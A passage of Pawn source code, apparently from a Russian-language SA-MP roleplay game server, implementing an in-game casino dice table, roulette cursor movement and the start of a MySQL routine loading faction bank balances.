			format(strings,128,"Bet:_%i~n~Bank:_%i~n~Money:_%i",BoneInfo[idx][Bet],BoneInfo[idx][bBank],PlayerInfo[i][pCash]);
			PlayerTextDrawSetString(i,PlayerBone[i][3],strings);
			for(new i_ = 0; i_ < 5; i_++)
			{
				if(BoneInfo[idx][Gamer][i_] != INVALID_PLAYER_ID) format(strings,128,"%s~n~",PlayerInfo[BoneInfo[idx][Gamer][i_]][pName]);
				else format(strings,30,"--~n~");
				strcat(str,strings);
			}
			PlayerTextDrawSetString(i,PlayerBone[i][1],str);
			str = "";
			for(new i_ = 0; i_ < 5; i_++)
			{
				if(BoneInfo[idx][Gamer][i_] != INVALID_PLAYER_ID && GetPVarInt(BoneInfo[idx][Gamer][i_],"BoneStol_"))
				{
					if(GetPVarInt(BoneInfo[idx][Gamer][i_],"BoneStol_") == 1) format(strings,128,"++~n~");
					else format(strings,128,"%i~n~",GetPVarInt(BoneInfo[idx][Gamer][i_],"BoneStol_"));
				}
				else format(strings,30,"--~n~");
				strcat(str,strings);
			}
			PlayerTextDrawSetString(i,PlayerBone[i][2],str);
		}
	}
	return true;
}
stock ExitBone(playerid)
{
	new null[2] = 0;
	if(GetPVarInt(playerid,"BoneStol_") && BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] <= 0)
	{
		PlayerInfo[playerid][pCash]+=BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Bet];
		BoneInfo[GetPVarInt(playerid,"BoneStol")-1][bBank]-=BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Bet];
	}
	foreach(i)
	{
		if(GetPVarInt(i,"BoneStol") == GetPVarInt(playerid,"BoneStol") && i != playerid && GetPVarInt(i,"BoneStol_") == 1) null[0]++;
		if(GetPVarInt(i,"BoneStol") == GetPVarInt(playerid,"BoneStol") && i != playerid && GetPVarInt(i,"BoneStol_") > 1) null[1]++;
	}
	if(null[0] == 0 && null[1] > 0) ShowItog(GetPVarInt(playerid,"BoneStol")-1);
	if(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Crupie] == playerid) BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Crupie] = INVALID_PLAYER_ID;
	for(new i; i != 4; i++) TextDrawHideForPlayer(playerid,Bone[i]), PlayerTextDrawHide(playerid,PlayerBone[playerid][i]);
	for(new i_ = 0; i_ != 5; i_++) if(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Gamer][i_] == playerid) BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Gamer][i_] = INVALID_PLAYER_ID;
	UpdateBone(GetPVarInt(playerid,"BoneStol")-1);
	DeletePVar(playerid,"BoneStol");
	DeletePVar(playerid,"BoneStol_");
	CancelSelectTextDraw(playerid);
	return true;
}
stock ShowItog(idx)
{
	new itog[3] = -1; itog[0] = -1; itog[1] = -1; itog[2] = -1;
	foreach(i)
	{
		if(GetPVarInt(i,"BoneStol")-1 == idx && GetPVarInt(i,"BoneStol_") > 1 && GetPVarInt(i,"BoneStol_") > itog[0]) itog[0] = GetPVarInt(i,"BoneStol_"), itog[1] = i;
		if(GetPVarInt(i,"BoneStol")-1 == idx && GetPVarInt(i,"BoneStol_") > 1 && i != itog[1] && GetPVarInt(i,"BoneStol_") == itog[0]) itog[2] = i;
	}
	if(itog[2] > -1)
	{
		foreach(i)
		{
			if(GetPVarInt(i,"BoneStol")-1 == idx && GetPVarInt(i,"BoneStol_") > 1 && GetPVarInt(i,"BoneStol_") == itog[0]) SetPVarInt(i,"BoneStol_",1), BoneInfo[idx][GameStart] = 30, SCM(i,0x4B00B0AA," Вы попали в следующий раунд. У вас есть 30 секунд, чтобы бросить кости");
			else if(GetPVarInt(i,"BoneStol")-1 == idx) DeletePVar(i,"BoneStol_");
		}
		UpdateBone(idx);
	}
	else if(itog[1] > -1)
	{
		format(string,128," Игра окончена. Победитель игры: %s",PlayerInfo[itog[1]][pName]);
		switch(idx)
		{
		case 0..5:
			{
				if(CasinoInfo[1][caMafia] == 6) MafiaBank[0][nYakuza]+= BoneInfo[idx][bBank]-(BoneInfo[idx][bBank]/100*90);
				else if(CasinoInfo[1][caMafia] == 14) MafiaBank[0][nRm]+= BoneInfo[idx][bBank]-(BoneInfo[idx][bBank]/100*90);
				else if(CasinoInfo[1][caMafia] == 5) MafiaBank[0][nLcn]+= BoneInfo[idx][bBank]-(BoneInfo[idx][bBank]/100*90);
			}
		default:
			{
				if(CasinoInfo[2][caMafia] == 6) MafiaBank[0][nYakuza]+= BoneInfo[idx][bBank]-(BoneInfo[idx][bBank]/100*90);
				else if(CasinoInfo[2][caMafia] == 14) MafiaBank[0][nRm]+= BoneInfo[idx][bBank]-(BoneInfo[idx][bBank]/100*90);
				else if(CasinoInfo[2][caMafia] == 5) MafiaBank[0][nLcn]+= BoneInfo[idx][bBank]-(BoneInfo[idx][bBank]/100*90);
			}
		}
		if(BoneInfo[idx][Crupie] != INVALID_PLAYER_ID) PlayerInfo[BoneInfo[idx][Crupie]][pPayCheck]+=150;
		PlayerInfo[itog[1]][pCash]+=BoneInfo[idx][bBank]-(BoneInfo[idx][bBank]/100*10);
		BoneInfo[idx][GameStart] = 0;
		BoneInfo[idx][Bet] = 0;
		BoneInfo[idx][bBank] = 0;
		foreach(i)
		{
			if(GetPVarInt(i,"BoneStol")-1 == idx)
			{
				SCM(i,0x4B00B0AA,string);
				DeletePVar(i,"BoneStol_");
			}
		}
		UpdateBone(idx);
	}
	return true;
}
stock Up(playerid)
{
	new str[0x5];
	switch(GetPVarInt(playerid,"RStol"))
	{
	case 1..4:
		{
			str = "RY";
			switch(GetPVarInt(playerid,"RNumber"))
			{
			case 1..5: {
					SetPVarFloat(playerid,"RX",GetPVarFloat(playerid,"RXONE"));
					SetPVarFloat(playerid,"RY",GetPVarFloat(playerid,"RYONE"));
					SetPVarFloat(playerid,"RZ",GetPVarFloat(playerid,"RZONE"));
					SetPVarInt(playerid,"RNumber",0); }
			case 6..115: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.076), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-5);
			case 116,118,120: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.152), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-5);
			case 123,122: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.608), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-1);
			case 121: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-1.216), SetPVarInt(playerid,"RNumber",123);
			case 125..129: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.304), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-1);
			case 124: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-1.520), SetPVarInt(playerid,"RNumber",129);
			}
		}
	default:
		{
			str = "RX";
			switch(GetPVarInt(playerid,"RNumber"))
			{
			case 1..5: {
					SetPVarFloat(playerid,"RX",GetPVarFloat(playerid,"RXONE"));
					SetPVarFloat(playerid,"RY",GetPVarFloat(playerid,"RYONE"));
					SetPVarFloat(playerid,"RZ",GetPVarFloat(playerid,"RZONE"));
					SetPVarInt(playerid,"RNumber",0); }
			case 6..115: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.076), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-5);
			case 116,118,120: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.152), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-5);
			case 123,122: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.608), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-1);
			case 121: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+1.216), SetPVarInt(playerid,"RNumber",123);
			case 125..129: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.304), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-1);
			case 124: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+1.520), SetPVarInt(playerid,"RNumber",129);
			}
		}
	}
	SetObjectPos(GetPVarInt(playerid,"RObj"),GetPVarFloat(playerid,"RX"),GetPVarFloat(playerid,"RY"),GetPVarFloat(playerid,"RZ"));
	return SetPlayerCameraLookAt(playerid,GetPVarFloat(playerid,"RX"),GetPVarFloat(playerid,"RY"),GetPVarFloat(playerid,"RZ"));
}
stock Right(playerid)
{
	new str[0x5], str_[0x5];
	switch(GetPVarInt(playerid,"RStol"))
	{
	case 1..4: str = "RX", str_ = "RY";
	default: str = "RY", str_ = "RX";
	}
	switch(GetPVarInt(playerid,"RNumber"))
	{
	case 1..4,6..9,11..14,16..19,21..24,26..29,31..34,36..39,41..44,46..49,51..54,56..59,61..64,66..69,71..74,76..79,81..84,86..89,91..94,96..99,101..104,106..109,111..114: {
			SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.110);
			SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+1); }
	case 116,118: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+2);
	case 120: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.440), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-4);
	case 121: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarInt(playerid,"RNumber",16);
	case 122: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarInt(playerid,"RNumber",56);
	case 123: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarInt(playerid,"RNumber",96);
	case 129:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",123);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",123);
			}
		}
	case 128:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",123);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",123);
			}
		}
	case 127:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",122);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",122);
			}
		}
	case 126:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",122);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",122);
			}
		}
	case 125:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",121);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",121);
			}
		}
	case 124:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",121);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",121);
			}
		}
	}
	SetObjectPos(GetPVarInt(playerid,"RObj"),GetPVarFloat(playerid,"RX"),GetPVarFloat(playerid,"RY"),GetPVarFloat(playerid,"RZ"));
	return SetPlayerCameraLookAt(playerid,GetPVarFloat(playerid,"RX"),GetPVarFloat(playerid,"RY"),GetPVarFloat(playerid,"RZ"));
}
stock Left(playerid)
{
	new str[0x5], str_[0x5];
	switch(GetPVarInt(playerid,"RStol"))
	{
	case 1..4: str = "RX", str_ = "RY";
	default: str = "RY", str_ = "RX";
	}
	switch(GetPVarInt(playerid,"RNumber"))
	{
	case 2..5,7..10,12..15,17..20,22..25,27..30,32..35,37..40,42..45,47..50,52..55,57..60,62..65,67..70,72..75,77..80,82..85,87..90,92..95,97..100,102..105,107..110,112..115: {
			SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.110);
			SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-1); }
	case 118,120: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")-2);
	case 116: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.440), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+4);
	case 31:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.228), SetPVarInt(playerid,"RNumber",121);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.228), SetPVarInt(playerid,"RNumber",121);
			}
		}
	case 36:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.304), SetPVarInt(playerid,"RNumber",122);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.304), SetPVarInt(playerid,"RNumber",122);
			}
		}
	case 76:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.304), SetPVarInt(playerid,"RNumber",123);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.304), SetPVarInt(playerid,"RNumber",123);
			}
		}
	case 81:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.228), SetPVarInt(playerid,"RNumber",123);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.228), SetPVarInt(playerid,"RNumber",123);
			}
		}
	case 86:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",123);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",123);
			}
		}
	case 91:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.076), SetPVarInt(playerid,"RNumber",123);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.076), SetPVarInt(playerid,"RNumber",123);
			}
		}
	case 96: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarInt(playerid,"RNumber",123);
	case 101:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.076), SetPVarInt(playerid,"RNumber",123);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.076), SetPVarInt(playerid,"RNumber",123);
			}
		}
	case 106:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",123);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",123);
			}
		}
	case 111:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.228), SetPVarInt(playerid,"RNumber",123);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.228), SetPVarInt(playerid,"RNumber",123);
			}
		}
	case 71:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.228), SetPVarInt(playerid,"RNumber",122);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.228), SetPVarInt(playerid,"RNumber",122);
			}
		}
	case 26:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",121);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",121);
			}
		}
	case 66:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",122);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",122);
			}
		}
	case 21:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.076), SetPVarInt(playerid,"RNumber",121);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.076), SetPVarInt(playerid,"RNumber",121);
			}
		}
	case 61:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.076), SetPVarInt(playerid,"RNumber",122);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.076), SetPVarInt(playerid,"RNumber",121);
			}
		}
	case 16: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarInt(playerid,"RNumber",121);
	case 56: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarInt(playerid,"RNumber",122);
	case 11:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.076), SetPVarInt(playerid,"RNumber",121);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.076), SetPVarInt(playerid,"RNumber",121);
			}
		}
	case 51:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.076), SetPVarInt(playerid,"RNumber",122);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.076), SetPVarInt(playerid,"RNumber",122);
			}
		}
	case 6:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",121);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",121);
			}
		}
	case 46:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",122);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",122);
			}
		}
	case 1:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.228), SetPVarInt(playerid,"RNumber",121);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.228), SetPVarInt(playerid,"RNumber",121);
			}
		}
	case 41:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.228), SetPVarInt(playerid,"RNumber",122);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.228), SetPVarInt(playerid,"RNumber",122);
			}
		}
	case 121:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",124);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",124);
			}
		}
	case 122:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",126);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",126);
			}
		}
	case 123:
		{
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1..4: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.152), SetPVarInt(playerid,"RNumber",128);
			default: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.220), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.152), SetPVarInt(playerid,"RNumber",128);
			}
		}
	}
	SetObjectPos(GetPVarInt(playerid,"RObj"),GetPVarFloat(playerid,"RX"),GetPVarFloat(playerid,"RY"),GetPVarFloat(playerid,"RZ"));
	return SetPlayerCameraLookAt(playerid,GetPVarFloat(playerid,"RX"),GetPVarFloat(playerid,"RY"),GetPVarFloat(playerid,"RZ"));
}
stock Down(playerid)
{
	new str[0x5], str_[0x5];
	switch(GetPVarInt(playerid,"RStol"))
	{
	case 1..4:
		{
			str = "RY", str_ = "RX";
			switch(GetPVarInt(playerid,"RNumber"))
			{
			case 0: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.152), SetPVarInt(playerid,"RNumber",3);
			case 111,113,115: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.152), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+5);
			case 1..110: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.076), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+5);
			case 114: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.152), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.110), SetPVarInt(playerid,"RNumber",118);
			case 112: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.152), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.110), SetPVarInt(playerid,"RNumber",118);
			case 122,121: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.608), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+1);
			case 123: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+1.216), SetPVarInt(playerid,"RNumber",121);
			case 124..128: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-0.304), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+1);
			case 129: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+1.520), SetPVarInt(playerid,"RNumber",124);
			}
		}
	default:
		{
			str = "RX", str_ = "RY";
			switch(GetPVarInt(playerid,"RNumber"))
			{
			case 0: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.152), SetPVarInt(playerid,"RNumber",3);
			case 111,113,115: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.152), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+5);
			case 1..110: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.076), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+5);
			case 114: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.152), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)-0.110), SetPVarInt(playerid,"RNumber",118);
			case 112: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.152), SetPVarFloat(playerid,str_,GetPVarFloat(playerid,str_)+0.110), SetPVarInt(playerid,"RNumber",118);
			case 122,121: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.608), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+1);
			case 123: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-1.216), SetPVarInt(playerid,"RNumber",121);
			case 124..128: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)+0.304), SetPVarInt(playerid,"RNumber",GetPVarInt(playerid,"RNumber")+1);
			case 129: SetPVarFloat(playerid,str,GetPVarFloat(playerid,str)-1.520), SetPVarInt(playerid,"RNumber",124);
			}
		}
	}
	SetObjectPos(GetPVarInt(playerid,"RObj"),GetPVarFloat(playerid,"RX"),GetPVarFloat(playerid,"RY"),GetPVarFloat(playerid,"RZ"));
	return SetPlayerCameraLookAt(playerid,GetPVarFloat(playerid,"RX"),GetPVarFloat(playerid,"RY"),GetPVarFloat(playerid,"RZ"));
}
publics: OnMySQL_QUERY(idx, playerid, str[])
{
	
	new r, f, x;
	cache_get_data(r, f);
	switch(idx)
	{
	case 0:
		{
			if(!r) return printf("[Загрузка ...] Данные из Others не получены!");
			FracBank[0][fLsnews] = 		cache_get_row_int(0,0, DATABASE);
			FracBank[0][fSfnews] = 		cache_get_row_int(0,1, DATABASE);
			FracBank[0][fLvnews] = 		cache_get_row_int(0,2, DATABASE);
			FracBank[0][fBallas] = 		cache_get_row_int(0,3, DATABASE);
			FracBank[0][fVagos] = 		cache_get_row_int(0,4, DATABASE);
			FracBank[0][fGrove] = 		cache_get_row_int(0,5, DATABASE);
			FracBank[0][fAztek] = 		cache_get_row_int(0,6, DATABASE);
			FracBank[0][fRifa] = 		cache_get_row_int(0,7, DATABASE);
			FracBank[0][fKazna] = 		cache_get_row_int(0,8, DATABASE);
			FracBank[0][fSsmc] = 		cache_get_row_int(0,9, DATABASE);
